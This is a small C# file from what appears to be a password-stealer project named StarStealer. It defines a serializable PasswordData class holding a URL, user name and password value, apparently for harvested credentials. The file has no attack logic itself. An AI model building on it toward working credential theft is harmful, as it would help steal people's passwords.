using System.Runtime.Serialization;

namespace StarStealer.Models
{
    [DataContract]
    class PasswordData
    {
        [DataMember]
        public string URL { get; set; }
        [DataMember]
        public string UserName { get; set; }
        [DataMember]
        public string PasswordValue { get; set; }
    }
}
